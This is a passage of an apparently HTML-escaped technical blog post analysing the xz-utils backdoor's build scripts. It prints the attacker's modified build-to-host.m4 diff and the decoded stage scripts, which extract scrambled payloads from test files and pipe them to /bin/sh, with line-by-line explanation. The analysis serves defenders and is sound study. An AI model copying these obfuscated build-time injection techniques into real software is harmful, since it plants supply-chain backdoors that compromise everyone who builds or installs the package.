embedded, compressed and encrypted, in some binary files that were added as “test inputs” for some new tests. The test file directory already existed from long before Jia Tan arrived, and the README explained “This directory contains bunch of files to test handling of .xz, .lzma (LZMA_Alone), and .lz (lzip) files in decoder implementations. Many of the files have been created by hand with a hex editor, thus there is no better “source code” than the files themselves.” This is a fact of life for parsing libraries like liblzma. The attacker looked like they were just &lt;a href=&#34;https://git.tukaani.org/?p=xz.git;a=commitdiff;h=cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0&#34;&gt;adding a few new test files&lt;/a&gt;.&#xA;&#xA;&lt;p&gt;&#xA;Unfortunately the nefarious object file turned out to have a bug that caused problems with Valgrind, so the test files needed to be updated to add the fix. &lt;a href=&#34;https://git.tukaani.org/?p=xz.git;a=commitdiff;h=74b138d2a6529f2c07729d7c77b1725a8e8b16f1&#34;&gt;That commit&lt;/a&gt; explained “The original files were generated with random local to my machine. To better reproduce these files in the future, a constant seed was used to recreate these files.” The attackers realized at this point that they needed a better update mechanism, so the new nefarious script contains an extension mechanism that lets it look for updated scripts in new test files, which wouldn’t draw as much attention as rewriting existing ones.&#xA;&#xA;&lt;p&gt;&#xA;The effect of the scripts is to arrange for the nefarious object file’s &lt;code&gt;_get_cpuid&lt;/code&gt; function to be called as part of a &lt;a href=&#34;https://sourceware.org/glibc/wiki/GNU_IFUNC&#34;&gt;GNU indirect function&lt;/a&gt; (ifunc) resolver. In general these resolvers can be called lazily at any time during program execution, but for security reasons it has become popular to call all of them during dynamic linking (very early in program startup) and then map the &lt;a href=&#34;https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html&#34;&gt;global offset table (GOT) and procedure linkage table (PLT) read-only&lt;/a&gt;, to keep buffer overflows and the like from being able to edit it. But a nefarious ifunc resolver would run early enough to be able to edit those tables, and that’s exactly what the backdoor introduced. The resolver then looked through the tables for &lt;code&gt;RSA_public_decrypt&lt;/code&gt; and replaced it with a nefarious version that &lt;a href=&#34;https://github.com/amlweems/xzbot&#34;&gt;runs attacker code when the right SSH certificate is presented&lt;/a&gt;.&#xA;&lt;a class=anchor href=&#34;#configure&#34;&gt;&lt;h2 id=&#34;configure&#34;&gt;Configure&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Again, this post looks at the script side of the attack. Like most complex Unix software, xz-utils uses GNU autoconf to decide how to build itself on a particular system. In ordinary operation, autoconf reads a &lt;code&gt;configure.ac&lt;/code&gt; file and produces a &lt;code&gt;configure&lt;/code&gt; script, perhaps with supporting m4 files brought in to provide “libraries” to the script. Usually, the &lt;code&gt;configure&lt;/code&gt; script and its support libraries are only added to the tarball distributions, not the source repository. The xz distribution works this way too.&#xA;&#xA;&lt;p&gt;&#xA;The attack kicks off with the attacker adding an unexpected support library, &lt;code&gt;m4/build-to-host.m4&lt;/code&gt; to the xz-5.6.0 and xz-5.6.1 tarball distributions. Compared to the standard &lt;code&gt;build-to-host.m4&lt;/code&gt;, the attacker has made the following changes:&#xA;&lt;pre&gt;diff --git a/build-to-host.m4 b/build-to-host.m4&#xA;index ad22a0a..d5ec315 100644&#xA;--- a/build-to-host.m4&#xA;+++ b/build-to-host.m4&#xA;@@ -1,5 +1,5 @@&#xA;-# build-to-host.m4 serial 3&#xA;-dnl Copyright (C) 2023 Free Software Foundation, Inc.&#xA;+# build-to-host.m4 serial 30&#xA;+dnl Copyright (C) 2023-2024 Free Software Foundation, Inc.&#xA; dnl This file is free software; the Free Software Foundation&#xA; dnl gives unlimited permission to copy and/or distribute it,&#xA; dnl with or without modifications, as long as this notice is preserved.&#xA;@@ -37,6 +37,7 @@ AC_DEFUN([gl_BUILD_TO_HOST],&#xA;&#xA;&#xA;   dnl Define somedir_c.&#xA;   gl_final_[$1]=&#34;$[$1]&#34;&#xA;+  gl_[$1]_prefix=`echo $gl_am_configmake | sed &#34;s/.*\.//g&#34;`&#xA;   dnl Translate it from build syntax to host syntax.&#xA;   case &#34;$build_os&#34; in&#xA;     cygwin*)&#xA;@@ -58,14 +59,40 @@ AC_DEFUN([gl_BUILD_TO_HOST],&#xA;   if test &#34;$[$1]_c_make&#34; = &#39;\&#34;&#39;&#34;${gl_final_[$1]}&#34;&#39;\&#34;&#39;; then&#xA;     [$1]_c_make=&#39;\&#34;$([$1])\&#34;&#39;&#xA;   fi&#xA;+  if test &#34;x$gl_am_configmake&#34; != &#34;x&#34;; then&#xA;+    gl_[$1]_config=&#39;sed \&#34;r\n\&#34; $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2&amp;gt;/dev/null&#39;&#xA;+  else&#xA;+    gl_[$1]_config=&#39;&#39;&#xA;+  fi&#xA;+  _LT_TAGDECL([], [gl_path_map], [2])dnl&#xA;+  _LT_TAGDECL([], [gl_[$1]_prefix], [2])dnl&#xA;+  _LT_TAGDECL([], [gl_am_configmake], [2])dnl&#xA;+  _LT_TAGDECL([], [[$1]_c_make], [2])dnl&#xA;+  _LT_TAGDECL([], [gl_[$1]_config], [2])dnl&#xA;   AC_SUBST([$1_c_make])&#xA;+&#xA;+  dnl If the host conversion code has been placed in $gl_config_gt,&#xA;+  dnl instead of duplicating it all over again into config.status,&#xA;+  dnl then we will have config.status run $gl_config_gt later, so it&#xA;+  dnl needs to know what name is stored there:&#xA;+  AC_CONFIG_COMMANDS([build-to-host], [eval $gl_config_gt | $SHELL 2&amp;gt;/dev/null], [gl_config_gt=&#34;eval \$gl_[$1]_config&#34;])&#xA; ])&#xA;&#xA;&#xA; dnl Some initializations for gl_BUILD_TO_HOST.&#xA; AC_DEFUN([gl_BUILD_TO_HOST_INIT],&#xA; [&#xA;+  dnl Search for Automake-defined pkg* macros, in the order&#xA;+  dnl listed in the Automake 1.10a+ documentation.&#xA;+  gl_am_configmake=`grep -aErls &#34;#{4}[[:alnum:]]{5}#{4}$&#34; $srcdir/ 2&amp;gt;/dev/null`&#xA;+  if test -n &#34;$gl_am_configmake&#34;; then&#xA;+    HAVE_PKG_CONFIGMAKE=1&#xA;+  else&#xA;+    HAVE_PKG_CONFIGMAKE=0&#xA;+  fi&#xA;+&#xA;   gl_sed_double_backslashes=&#39;s/\\/\\\\/g&#39;&#xA;   gl_sed_escape_doublequotes=&#39;s/&#34;/\\&#34;/g&#39;&#xA;+  gl_path_map=&#39;tr &#34;\t \-_&#34; &#34; \t_\-&#34;&#39;&#xA; changequote(,)dnl&#xA;   gl_sed_escape_for_make_1=&#34;s,\\([ \&#34;&amp;amp;&#39;();&amp;lt;&amp;gt;\\\\\`|]\\),\\\\\\1,g&#34;&#xA; changequote([,])dnl&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;All in all, this is a fairly plausible set of diffs, in case anyone thought to check. It bumps the version number, updates the copyright year to look current, and makes a handful of inscrutable changes that don’t look terribly out of place.&#xA;&#xA;&lt;p&gt;&#xA;Looking closer, something is amiss. Starting near the bottom,&#xA;&lt;pre&gt;gl_am_configmake=`grep -aErls &#34;#{4}[[:alnum:]]{5}#{4}$&#34; $srcdir/ 2&amp;gt;/dev/null`&#xA;if test -n &#34;$gl_am_configmake&#34;; then&#xA;  HAVE_PKG_CONFIGMAKE=1&#xA;else&#xA;  HAVE_PKG_CONFIGMAKE=0&#xA;fi&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Let’s see which files in the distribution match the pattern (simplifying the &lt;code&gt;grep&lt;/code&gt; command):&#xA;&lt;pre&gt;% egrep -Rn &#39;####[[:alnum:]][[:alnum:]][[:alnum:]][[:alnum:]][[:alnum:]]####$&#39;&#xA;Binary file ./tests/files/bad-3-corrupt_lzma2.xz matches&#xA;%&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;That’s surprising! So this script sets &lt;code&gt;gl_am_configmake=./tests/files/bad-3-corrupt_lzma2.xz&lt;/code&gt; and &lt;code&gt;HAVE_PKG_CONFIGMAKE=1&lt;/code&gt;. The &lt;code&gt;gl_path_map&lt;/code&gt; setting is a &lt;a href=&#34;https://linux.die.net/man/1/tr&#34;&gt;tr(1)&lt;/a&gt; command that swaps tabs and spaces and swaps underscores and dashes.&#xA;&#xA;&lt;p&gt;&#xA;Now reading the top of the script,&#xA;&lt;pre&gt;gl_[$1]_prefix=`echo $gl_am_configmake | sed &#34;s/.*\.//g&#34;`&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;extracts the final dot-separated element of that filename, leaving &lt;code&gt;xz&lt;/code&gt;. That is, it’s the file name suffix, not a prefix, and it is the name of the compression command that is likely already installed on any build machine.&#xA;&#xA;&lt;p&gt;&#xA;The next section is:&#xA;&lt;pre&gt;if test &#34;x$gl_am_configmake&#34; != &#34;x&#34;; then&#xA;  gl_[$1]_config=&#39;sed \&#34;r\n\&#34; $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2&amp;gt;/dev/null&#39;&#xA;else&#xA;  gl_[$1]_config=&#39;&#39;&#xA;fi&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;We know that &lt;code&gt;gl_am_configmake=./tests/files/bad-3-corrupt_lzma2.xz&lt;/code&gt;, so this sets the &lt;code&gt;gl_[$1]_config&lt;/code&gt; variable to the string&#xA;&lt;pre&gt;sed &#34;r\n&#34; $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2&amp;gt;/dev/null&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;At first glance, especially in the original quoted form, the &lt;code&gt;sed&lt;/code&gt; command looks like it has something to do with line endings, but in fact &lt;code&gt;r\n&lt;/code&gt; is the &lt;code&gt;sed&lt;/code&gt; “read from file &lt;code&gt;\n&lt;/code&gt;” command. Since the file &lt;code&gt;\n&lt;/code&gt; does not exist, the command does nothing at all, and then since &lt;code&gt;sed&lt;/code&gt; has not been invoked with the &lt;code&gt;-n&lt;/code&gt; option, &lt;code&gt;sed&lt;/code&gt; prints each line of input. So &lt;code&gt;sed &#34;r\n&#34;&lt;/code&gt; is just an obfuscated &lt;code&gt;cat&lt;/code&gt; command, and remember that &lt;code&gt;$gl_path_map&lt;/code&gt; is the &lt;code&gt;tr&lt;/code&gt; command from before, and &lt;code&gt;$gl_[$1]_prefix&lt;/code&gt; is &lt;code&gt;xz&lt;/code&gt;. To the shell, this command is really&#xA;&lt;pre&gt;cat ./tests/files/bad-3-corrupt_lzma2.xz | tr &#34;\t \-_&#34; &#34; \t_\-&#34; | xz -d&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;But right now it’s still just a string; it hasn’t been run. That changes with&#xA;&lt;pre&gt;dnl If the host conversion code has been placed in $gl_config_gt,&#xA;dnl instead of duplicating it all over again into config.status,&#xA;dnl then we will have config.status run $gl_config_gt later, so it&#xA;dnl needs to know what name is stored there:&#xA;AC_CONFIG_COMMANDS([build-to-host], [eval $gl_config_gt | $SHELL 2&amp;gt;/dev/null], [gl_config_gt=&#34;eval \$gl_[$1]_config&#34;])&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;The final &lt;code&gt;&#34;eval \$gl_[$1]_config&#34;&lt;/code&gt; runs that command. If we run it on the xz 5.6.0 repo, we get:&#xA;&lt;pre&gt;$ cat ./tests/files/bad-3-corrupt_lzma2.xz | tr &#34;\t \-_&#34; &#34; \t_\-&#34; | xz -d&#xA;####Hello####&#xA;#��Z�.hj�&#xA;eval `grep ^srcdir= config.status`&#xA;if test -f ../../config.status;then&#xA;eval `grep ^srcdir= ../../config.status`&#xA;srcdir=&#34;../../$srcdir&#34;&#xA;fi&#xA;export i=&#34;((head -c +1024 &amp;gt;/dev/null) &amp;amp;&amp;amp; head -c +2048 &amp;amp;&amp;amp;&#xA;    (head -c +1024 &amp;gt;/dev/null) &amp;amp;&amp;amp; head -c +2048 &amp;amp;&amp;amp;&#xA;    (head -c +1024 &amp;gt;/dev/null) &amp;amp;&amp;amp; head -c +2048 &amp;amp;&amp;amp;&#xA;    (head -c +1024 &amp;gt;/dev/null) &amp;amp;&amp;amp; head -c +2048 &amp;amp;&amp;amp;&#xA;    (head -c +1024 &amp;gt;/dev/null) &amp;amp;&amp;amp; head -c +2048 &amp;amp;&amp;amp;&#xA;    (head -c +1024 &amp;gt;/dev/null) &amp;amp;&amp;amp; head -c +2048 &amp;amp;&amp;amp;&#xA;    (head -c +1024 &amp;gt;/dev/null) &amp;amp;&amp;amp; head -c +2048 &amp;amp;&amp;amp;&#xA;    (head -c +1024 &amp;gt;/dev/null) &amp;amp;&amp;amp; head -c +2048 &amp;amp;&amp;amp;&#xA;    (head -c +1024 &amp;gt;/dev/null) &amp;amp;&amp;amp; head -c +2048 &amp;amp;&amp;amp;&#xA;    (head -c +1024 &amp;gt;/dev/null) &amp;amp;&amp;amp; head -c +2048 &amp;amp;&amp;amp;&#xA;    (head -c +1024 &amp;gt;/dev/null) &amp;amp;&amp;amp; head -c +2048 &amp;amp;&amp;amp;&#xA;    (head -c +1024 &amp;gt;/dev/null) &amp;amp;&amp;amp; head -c +2048 &amp;amp;&amp;amp;&#xA;    (head -c +1024 &amp;gt;/dev/null) &amp;amp;&amp;amp; head -c +2048 &amp;amp;&amp;amp;&#xA;    (head -c +1024 &amp;gt;/dev/null) &amp;amp;&amp;amp; head -c +2048 &amp;amp;&amp;amp;&#xA;    (head -c +1024 &amp;gt;/dev/null) &amp;amp;&amp;amp; head -c +2048 &amp;amp;&amp;amp;&#xA;    (head -c +1024 &amp;gt;/dev/null) &amp;amp;&amp;amp; head -c +2048 &amp;amp;&amp;amp;&#xA;    (head -c +1024 &amp;gt;/dev/null) &amp;amp;&amp;amp; head -c +724)&#34;;&#xA;(xz -dc $srcdir/tests/files/good-large_compressed.lzma|&#xA;    eval $i|tail -c +31265|&#xA;    tr &#34;\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131&#34; &#34;\0-\377&#34;)|&#xA;    xz -F raw --lzma1 -dc|/bin/sh&#xA;####World####&#xA;$&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;I have inserted some line breaks, here and in later script fragments,&#xA;to keep the lines from being too long in the web page.&#xA;&#xA;&lt;p&gt;&#xA;Why the Hello and World? The README text that came with the test file describes it:&lt;blockquote&gt;&#xA;&#xA;&lt;p&gt;&#xA;bad-3-corrupt_lzma2.xz has three Streams in it. The first and third streams are valid xz Streams. The middle Stream has a correct Stream Header, Block Header, Index and Stream Footer. Only the LZMA2 data is corrupt. This file should decompress if &lt;code&gt;--single-stream&lt;/code&gt; is used.&lt;/blockquote&gt;&#xA;&#xA;&lt;p&gt;&#xA;The first and third streams are the Hello and World, and the middle stream has been corrupted by swapping the byte values unswapped by the &lt;code&gt;tr&lt;/code&gt; command.&#xA;&#xA;&lt;p&gt;&#xA;Recalling that xz 5.6.1 shipped with different “test” files, we can also try xz 5.6.1:&#xA;&lt;pre&gt;$ cat ./tests/files/bad-3-corrupt_lzma2.xz | tr &#34;\t \-_&#34; &#34; \t_\-&#34; | xz -d&#xA;####Hello####&#xA;#�U��$�&#xA;[ ! $(uname) = &#34;Linux&#34; ] &amp;amp;&amp;amp; exit 0&#xA;[ ! $(uname) = &#34;Linux&#34; ] &amp;amp;&amp;amp; exit 0&#xA;[ ! $(uname) = &#34;Linux&#34; ] &amp;amp;&amp;amp; exit 0&#xA;[ ! $(uname) = &#34;Linux&#34; ] &amp;amp;&amp;amp; exit 0&#xA;[ ! $(uname) = &#34;Linux&#34; ] &amp;amp;&amp;amp; exit 0&#xA;eval `grep ^srcdir= config.status`&#xA;if test -f ../../config.status;then&#xA;eval `grep ^srcdir= ../../config.status`&#xA;srcdir=&#34;../../$srcdir&#34;&#xA;fi&#xA;export i=&#34;((head -c +1024 &amp;gt;/dev/null) &amp;amp;&amp;amp; head -c +2048 &amp;amp;&amp;amp;&#xA;    (head -c +1024 &amp;gt;/dev/null) &amp;amp;&amp;amp; head -c +2048 &amp;amp;&amp;amp;&#xA;    (head -c +1024 &amp;gt;/dev/null) &amp;amp;&amp;amp; head -c +2048 &amp;amp;&amp;amp;&#xA;    (head -c +1024 &amp;gt;/dev/null) &amp;amp;&amp;amp; head -c +2048 &amp;amp;&amp;amp;&#xA;    (head -c +1024 &amp;gt;/dev/null) &amp;amp;&amp;amp; head -c +2048 &amp;amp;&amp;amp;&#xA;    (head -c +1024 &amp;gt;/dev/null) &amp;amp;&amp;amp; head -c +2048 &amp;amp;&amp;amp;&#xA;    (head -c +1024 &amp;gt;/dev/null) &amp;amp;&amp;amp; head -c +2048 &amp;amp;&amp;amp;&#xA;    (head -c +1024 &amp;gt;/dev/null) &amp;amp;&amp;amp; head -c +2048 &amp;amp;&amp;amp;&#xA;    (head -c +1024 &amp;gt;/dev/null) &amp;amp;&amp;amp; head -c +2048 &amp;amp;&amp;amp;&#xA;    (head -c +1024 &amp;gt;/dev/null) &amp;amp;&amp;amp; head -c +2048 &amp;amp;&amp;amp;&#xA;    (head -c +1024 &amp;gt;/dev/null) &amp;amp;&amp;amp; head -c +2048 &amp;amp;&amp;amp;&#xA;    (head -c +1024 &amp;gt;/dev/null) &amp;amp;&amp;amp; head -c +2048 &amp;amp;&amp;amp;&#xA;    (head -c +1024 &amp;gt;/dev/null) &amp;amp;&amp;amp; head -c +2048 &amp;amp;&amp;amp;&#xA;    (head -c +1024 &amp;gt;/dev/null) &amp;amp;&amp;amp; head -c +2048 &amp;amp;&amp;amp;&#xA;    (head -c +1024 &amp;gt;/dev/null) &amp;amp;&amp;amp; head -c +2048 &amp;amp;&amp;amp;&#xA;    (head -c +1024 &amp;gt;/dev/null) &amp;amp;&amp;amp; head -c +2048 &amp;amp;&amp;amp;&#xA;    (head -c +1024 &amp;gt;/dev/null) &amp;amp;&amp;amp; head -c +939)&#34;;&#xA;(xz -dc $srcdir/tests/files/good-large_compressed.lzma|&#xA;    eval $i|tail -c +31233|&#xA;    tr &#34;\114-\321\322-\377\35-\47\14-\34\0-\13\50-\113&#34; &#34;\0-\377&#34;)|&#xA;    xz -F raw --lzma1 -dc|/bin/sh&#xA;####World####&#xA;$&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;The first difference is that the script makes sure (very sure!) to exit if not being run on Linux. The second difference is that the long “&lt;code&gt;export i&lt;/code&gt;” line deviates in the final head command offset (724 vs 939) and then the tail offset and the &lt;code&gt;tr&lt;/code&gt; argument. Let’s break those down.&#xA;&#xA;&lt;p&gt;&#xA;The &lt;code&gt;head&lt;/code&gt; command prints a prefix of its input. Let’s look at the start:&#xA;&lt;pre&gt;(head -c +1024 &amp;gt;/dev/null) &amp;amp;&amp;amp; head -c +2048 &amp;amp;&amp;amp;&#xA;(head -c +1024 &amp;gt;/dev/null) &amp;amp;&amp;amp; head -c +2048 &amp;amp;&amp;amp; ...&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;This discards the first kilobyte of standard input, prints the next two kilobytes, discards the next kilobyte, and prints the next two kilobytes. And so on. The whole command for 5.6.1 is:&#xA;&lt;pre&gt;(head -c +1024 &amp;gt;/dev/null) &amp;amp;&amp;amp; head -c +2048 &amp;amp;&amp;amp;&#xA;(head -c +1024 &amp;gt;/dev/null) &amp;amp;&amp;amp; head -c +2048 &amp;amp;&amp;amp;&#xA;... 16 times total ...&#xA;head -c +939&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;The shell variable &lt;code&gt;i&lt;/code&gt; is set to this long command. Then the script runs:&#xA;&lt;pre&gt;xz -dc $srcdir/tests/files/good-large_compressed.lzma |&#xA;eval $i |&#xA;tail -c +31233 |&#xA;tr &#34;\114-\321\322-\377\35-\47\14-\34\0-\13\50-\113&#34; &#34;\0-\377&#34; |&#xA;xz -F raw --lzma1 -dc |&#xA;/bin/sh&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;The first &lt;code&gt;xz&lt;/code&gt; command uncompresses another malicious test file. The &lt;code&gt;eval&lt;/code&gt; then runs the &lt;code&gt;head&lt;/code&gt; pipeline, extracting a total of 16×2048+939 = 33,707 bytes. Then the &lt;code&gt;tail&lt;/code&gt; command keeps only the final 31,233 bytes. The &lt;code&gt;tr&lt;/code&gt; command applies a simple substitution cipher to the output (so that just in case anyone thought to pull these specific byte ranges out of the file, they wouldn’t recognize it as a valid lzma input!?). The second &lt;code&gt;xz&lt;/code&gt; command decodes the translated bytes as a raw lzma stream, and then of course the result is piped through the shell.&#xA;&#xA;&lt;p&gt;&#xA;Skipping the shell pipe, we can run this, obtaining a very long shell script. I have added commentary in between sections of the output.&#xA;&lt;pre&gt;$ xz -dc $srcdir/tests/files/good-large_compressed.lzma |&#xA;  eval $i |&#xA;  tail -c +31233 |&#xA;  tr &#34;\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131&#34; &#34;\0-\377&#34; |&#xA;  xz -F raw --lzma1 -dc&#xA;P=&#34;-fPIC -DPIC -fno-lto -ffunction-sections -fdata-sections&#34;&#xA;C=&#34;pic_flag=\&#34; $P\&#34;&#34;&#xA;O=&#34;^pic_flag=\&#34; -fPIC -DPIC\&#34;$&#34;&#xA;R=&#34;is_arch_extension_supported&#34;&#xA;x=&#34;__get_cpuid(&#34;&#xA;p=&#34;good-large_compressed.lzma&#34;&#xA;U=&#34;bad-3-corrupt_lzma2.xz&#34;&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;So far, setting up environment variables.&#xA;&lt;pre&gt;[ ! $(uname)=&#34;Linux&#34; ] &amp;amp;&amp;amp; exit 0  # 5.6.1 only&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;A line that only appears in 5.6.1, exiting when not run on Linux. In general the scripts in 5.6.0 and 5.6.1 are very similar: 5.6.1 has a few additions. We will examine the 5.6.1 script, with the additions marked. This line is an attempted robustness fix with a bug (pointed out by Jakub Wilk): there are no spaces around the &lt;code&gt;=&lt;/code&gt;, making the line a no-op.&#xA;&lt;pre&gt;eval $zrKcVq&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;The first of many odd eval statements, for variables that do not appear to be set anywhere. One possibility is that these are debug prints: when the attacker is debugging the script, setting, say, &lt;code&gt;zrKcVq=env&lt;/code&gt; inserts a debug print during execution. Another possibility is that these are extension points that can be set by some other mechanism, run before this code, in the future.&#xA;&lt;pre&gt;if test -f config.status; then&#xA;eval $zrKcSS&#xA;eval `grep ^LD=\&#39;\/ config.status`&#xA;eval `grep ^CC=\&#39; config.status`&#xA;eval `grep ^GCC=\&#39; config.status`&#xA;eval `grep ^srcdir=\&#39; config.status`&#xA;eval `grep ^build=\&#39;x86_64 config.status`&#xA;eval `grep ^enable_shared=\&#39;yes\&#39; config.status`&#xA;eval `grep ^enable_static=\&#39; config.status`&#xA;eval `grep ^gl_path_map=\&#39; config.status`&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;If &lt;code&gt;config.status&lt;/code&gt; exists, we read various variables from it into the shell, along with two extension points. Note that we are still inside the config.status check (let’s call it “if #1”) as we continue through the output.&#xA;&lt;pre&gt;# Entirely new in 5.6.1&#xA;vs=`grep -broaF &#39;~!:_ W&#39; $srcdir/tests/files/ 2&amp;gt;/dev/null`&#xA;if test &#34;x$vs&#34; != &#34;x&#34; &amp;gt; /dev/null 2&amp;gt;&amp;amp;1;then&#xA;f1=`echo $vs | cut -d: -f1`&#xA;if test &#34;x$f1&#34; != &#34;x&#34; &amp;gt; /dev/null 2&amp;gt;&amp;amp;1;then&#xA;start=`expr $(echo $vs | cut -d: -f2) + 7`&#xA;ve=`grep -broaF &#39;|_!{ -&#39; $srcdir/tests/files/ 2&amp;gt;/dev/null`&#xA;if test &#34;x$ve&#34; != &#34;x&#34; &amp;gt; /dev/null 2&amp;gt;&amp;amp;1;then&#xA;f2=`echo $ve | cut -d: -f1`&#xA;if test &#34;x$f2&#34; != &#34;x&#34; &amp;gt; /dev/null 2&amp;gt;&amp;amp;1;then&#xA;[ ! &#34;x$f2&#34; = &#34;x$f1&#34; ] &amp;amp;&amp;amp; exit 0&#xA;[ ! -f $f1 ] &amp;amp;&amp;amp; exit 0&#xA;end=`expr $(echo $ve | cut -d: -f2) - $start`&#xA;eval `cat $f1 | tail -c +${start} | head -c +${end} |&#xA;    tr &#34;\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131&#34; &#34;\0-\377&#34; |&#xA;    xz -F raw --lzma2 -dc`&#xA;fi&#xA;fi&#xA;fi&#xA;fi&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;This section is entirely new in 5.6.1. It looks for a single test file to contain the magic texts &lt;code&gt;&#39;~!:_ W&#39;&lt;/code&gt; and &lt;code&gt;&#39;|_!{ -&#39;&lt;/code&gt;, extracts the bytes between them, applies a substitution cipher, decompresses the result, and evaluates the output as a shell script. This appears to be an extension mechanism, so that the next time changes are needed in this script, a new script can be added in a different test file, instead of having to &lt;a href=&#34;https://git.tukaani.org/?p=xz.git;a=commitdiff;h=74b138d2a6529f2c07729d7c77b1725a8e8b16f1&#34;&gt;make up reasons to regenerate existing binary test files&lt;/a&gt;.&#xA;&#xA;&lt;p&gt;&#xA;The next chunk continues with script that was present in 5.6.0.&#xA;&lt;pre&gt;eval $zrKccj&#xA;if ! grep -qs &#39;\[&#34;HAVE_FUNC_ATTRIBUTE_IFUNC&#34;\]=&#34; 1&#34;&#39; config.status &amp;gt; /dev/null 2&amp;gt;&amp;amp;1;then&#xA;exit 0&#xA;fi&#xA;if ! grep -qs &#39;define HAVE_FUNC_ATTRIBUTE_IFUNC 1&#39; config.h &amp;gt; /dev/null 2&amp;gt;&amp;amp;1;then&#xA;exit 0&#xA;fi&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Two different checks that &lt;a href=&#34;https://maskray.me/blog/2021-01-18-gnu-indirect-function&#34;&gt;GNU indirect function&lt;/a&gt; support is enabled. If not, stop the script. The backdoor requires this functionality.&#xA;&lt;pre&gt;if test &#34;x$enable_shared&#34; != &#34;xyes&#34;;then&#xA;exit 0&#xA;fi&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Require shared library support.&#xA;&lt;pre&gt;if ! (echo &#34;$build&#34; | grep -Eq &#34;^x86_64&#34; &amp;gt; /dev/null 2&amp;gt;&amp;amp;1) &amp;amp;&amp;amp; (echo &#34;$build&#34; | grep -Eq &#34;linux-gnu$&#34; &amp;gt; /dev/null 2&amp;gt;&amp;amp;1);then&#xA;exit 0&#xA;fi&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Require an x86-64 Linux system.&#xA;&lt;pre&gt;if ! grep -qs &#34;$R()&#34; $srcdir/src/liblzma/check/crc64_fast.c &amp;gt; /dev/null 2&amp;gt;&amp;amp;1; then&#xA;exit 0&#xA;fi&#xA;if ! grep -qs &#34;$R()&#34; $srcdir/src/liblzma/check/crc32_fast.c &amp;gt; /dev/null 2&amp;gt;&amp;amp;1; then&#xA;exit 0&#xA;fi&#xA;if ! grep -qs &#34;$R&#34; $srcdir/src/liblzma/check/crc_x86_clmul.h &amp;gt; /dev/null 2&amp;gt;&amp;amp;1; then&#xA;exit 0&#xA;fi&#xA;if ! grep -qs &#34;$x&#34; $srcdir/src/liblzma/check/crc_x86_clmul.h &amp;gt; /dev/null 2&amp;gt;&amp;amp;1; then&#xA;exit 0&#xA;fi&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Require all the crc ifunc code (in case it has been patched out?).&#xA;&lt;pre&gt;if test &#34;x$GCC&#34; != &#39;xyes&#39; &amp;gt; /dev/null 2&amp;gt;&amp;amp;1;then&#xA;exit 0&#xA;fi&#xA;if test &#34;x$CC&#34; != &#39;xgcc&#39; &amp;gt; /dev/null 2&amp;gt;&amp;amp;1;then&#xA;exit 0&#xA;fi&#xA;LDv=$LD&#34; -v&#34;&#xA;if ! $LDv 2&amp;gt;&amp;amp;1 | grep -qs &#39;GNU ld&#39; &amp;gt; /dev/null 2&amp;gt;&amp;amp;1;then&#xA;exit 0&#xA;fi&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Require gcc (not clang, I suppose) and GNU ld.&#xA;&lt;pre&gt;if ! test -f &#34;$srcdir/tests/files/$p&#34; &amp;gt; /dev/null 2&amp;gt;&amp;amp;1;then&#xA;exit 0&#xA;fi&#xA;if ! test -f &#34;$srcdir/tests/files/$U&#34; &amp;gt; /dev/null 2&amp;gt;&amp;amp;1;then&#xA;exit 0&#xA;fi&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Require the backdoor-containing test files. Of course, if these files didn’t exist, it’s unclear how we obtained this script in the first place, but better safe than sorry, I suppose.&#xA;&lt;pre&gt;if test -f &#34;$srcdir/debian/rules&#34; || test &#34;x$RPM_ARCH&#34; = &#34;xx86_64&#34;;then&#xA;eval $zrKcst&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Add a bunch of checks when the file &lt;code&gt;debian/rules&lt;/code&gt; exists or &lt;code&gt;$RPM_ARCH&lt;/code&gt; is set to &lt;code&gt;x86_64&lt;/code&gt;. Note that we are now inside two &lt;code&gt;if&lt;/code&gt; statements: the &lt;code&gt;config.status&lt;/code&gt; check above, and this one (let’s call it “if #2”).&#xA;&lt;pre&gt;j=&#34;^ACLOCAL_M4 = \$(top_srcdir)\/aclocal.m4&#34;&#xA;if ! grep -qs 